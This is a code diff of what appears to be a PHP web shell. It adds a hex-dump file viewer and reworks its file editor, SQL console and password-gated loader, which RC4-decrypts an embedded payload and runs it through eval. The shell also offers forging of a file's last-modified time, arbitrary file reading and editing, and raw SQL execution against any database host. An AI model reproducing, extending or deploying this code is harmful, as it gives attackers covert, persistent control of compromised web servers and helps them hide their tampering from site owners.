-						$pl = strlen(count($lines));
-						$sBuff .= '<b>Highlight +:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
-						
-						foreach($lines as $i => $line){
-							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
-						}
-
-						$sBuff .= '</div>';
+						$sBuff .= '<b>Hex Dump Preview</b><br>';
+						$str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
 					}
-				} else
-					sDialog(tText('hlerror', 'highlight_file() dont exist!'));
-			} else {
-				$str = @fread($fp, filesize($p['t']));
-				$sBuff .= '<b>File:</b><br>' .
-							'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
+					
+					$show_offset  = '00000000<br>';
+					$show_hex     = '';
+					$show_sBuff = '';
+					$counter      = 0;
+					$str_len      = strlen($str);
+					for ($i = 0; $i < $str_len; $i++){
+						$counter++;
+						$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
+						switch (ord($str[$i])){
+							case 0 :
+							case 9 :
+							case 10:
+							case 13:
+							case 32: $show_sBuff .= ' '; 
+								break;
+							default: $show_sBuff .= $str[$i];
+						}
+						if ($counter === $config['hd_rows']){
+							$counter = 0;
+							if ($i + 1 < $str_len) 
+								$show_offset .= sprintf('%08X', $i + 1) . '<br>';
+							$show_hex .= '<br>';
+							$show_sBuff .= "\n";
+						}
+					}
+					$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
+				} else if (isset($p['hl'])){
+					if (function_exists('highlight_file')){
+						if ($p['hl'] === 'n'){
+							$sBuff .= '<b>Highlight:</b><br>' .
+										'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
+						} else {
+							$code = substr(highlight_file($p['t'], true), 36, -15);
+							//if (substr_count($code, '<br>') > substr_count($code, "\n"))
+							$lines = explode('<br />', $code);
+							$pl = strlen(count($lines));
+							$sBuff .= '<b>Highlight +:</b><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
+							
+							foreach($lines as $i => $line){
+								$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
+							}
+
+							$sBuff .= '</div>';
+						}
+					} else
+						sDialog(tText('hlerror', 'highlight_file() dont exist!'));
+				} else {
+					$str = @fread($fp, filesize($p['t']));
+					$sBuff .= '<b>File:</b><br>' .
+								'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
+				}
 			}
 		} else
 			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
@@ -1855,7 +1868,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		if (file_exists($p['t'])){
 			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
 		
-			$sBuff .= '<h2>' . tText('edit', 'Edit') . '</h2>
+			$sBuff .= '<h2>' . tText('edit', 'Edit') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
 					<div class="alt1 stdui"><form name="cldate">
 						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
 						<h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
@@ -1879,21 +1892,21 @@ if (isset($p['me']) && $p['me'] === 'file'){
 					</form></div><br><br>';
 					
 			$fp = @fopen($p['t'], 'r');
-			$buf = @fread($fp, filesize($p['t']));
-			@fclose($fp);
-			if ($fp)
+			if ($fp) {
 				$sBuff .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
 								' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'edit') . mHide('a', $p['t']) . '
 								<h3>' . tText('e5', 'Edit file') . '</h3>
 								<p>
-									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
-									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
-									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=n&t=\' + euc(dpath(this, false)));">' . tText('hd', 'Hexdump') . '</a>]
-									[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hd=p&t=\' + euc(dpath(this, false)));">' . tText('hdp', 'Hexdump preview') . '</a>]
+									[' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=file&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
+									[' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=file&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
+									[' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=file&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
+									[' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=file&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
 								</p><br>
-								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc($buf) . '</textarea>
+								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc(@fread($fp, filesize($p['t']))) . '</textarea>
 								' . mSubmit(tText('go', 'Go!'), 'uiupdate(2)') . '
 							</form></div><br><br>';
+			}
+			@fclose($fp);
 		}
 	} else {
 		if (isset($p['ac']) && $p['ac'] === 'up')
@@ -2351,7 +2364,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
 				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
 				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
-				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.gebi(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
+				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
 				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
 				<table class="border" style="padding:0;"><tbody>
 				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
@@ -2399,8 +2412,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 			$sBuff .= '</td>
 				<td id="dbRes" style="vertical-align:top;width:100%;"></td>
 				</tr></tbody></table>';
-			if (isset($p['sqlinit'])) 
-				$sBuff .= mHide('jseval', 'dbhistory("v");');
+			if (isset($p['sqlinit'])) $sBuff .= mHide('jseval', 'dbhistory("s");');
 			
 			sql_close($p['sqltype'], $con);
 		} else
@@ -2428,7 +2440,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 					'<span id="sp">' . mInput(array('n'=>'sqlpass', 'tt'=>tText('sq1', 'Password'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
 					'<span id="so">' . mInput(array('n'=>'sqlport', 'tt'=>tText('sq2', 'Port (optional)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '</span>' .
 					mSelect('sqltype', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
-					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.gebi("sqltype"));dbhistory("v");') . 
+					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("sqltype"));dbhistory("v");') . 
 					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]));', 1) . '</center>' .
 					'</form></div>
 			</div>';
@@ -2947,7 +2959,7 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 		sessionStorage.setItem('{$config['consNames']['slogin']}', hash);
 	}
 	
-	post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4('me=loader', rc4Init(hash))));
+	post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4('me=loader" . (isset($p['dir']) ? "&dir=" . rawurlencode($p['dir']) : "") . "', rc4Init(hash))));
 	ajax.open('POST', '" . getSelf() . "', true);
 	ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 	ajax.setRequestHeader('Content-Length', post.length);
@@ -2957,11 +2969,11 @@ if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'
 	echo "
 	function load(hash){
 		loader = '" . base64_encode(rc4($loader, rc4Init($config['sPass']))) . "';
-		boxs = rc4Init(hash);
-		eval(rc4(atob(loader), boxs));			
+		eval(rc4(atob(loader), rc4Init(hash)));			
 	}
 	
-	if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) load(sessionStorage.getItem('{$config['consNames']['slogin']}'));
+	if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) 
+		load(sessionStorage.getItem('{$config['consNames']['slogin']}'));
 	"; ?>
 </script>
 </head><body>
